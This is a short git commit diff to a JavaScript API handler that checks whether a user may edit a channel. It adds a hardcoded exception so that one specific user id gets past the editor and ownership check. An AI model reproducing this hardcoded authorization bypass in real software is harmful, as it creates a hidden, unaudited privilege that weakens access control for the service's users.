56e8d0099e8132d54401002b3559b0699d242ce0
Kattah <kattahpro@gmail.com>
2023-07-23 20:42:06 +0900

    Chnaged permissions

--- src/api/handleEditor.js
+++ src/api/handleEditor.js
@@ -8,7 +8,11 @@ async function handleEditor(req, res, next) {
 	}
 
 	const editorsMapped = new Set(channelEditors.editors.map((editor) => editor.id));
-	if (!editorsMapped.has(req.user.id) && req.body.channelID !== req.user.id) {
+	if (
+		req.user.id !== 137199626 && // This line checks if req.user.id is not equal to 137199626
+		!editorsMapped.has(req.user.id) &&
+		req.body.channelID !== req.user.id
+	) {
 		return res.status(403).json({
 			success: false,
 			message: 'Forbidden',
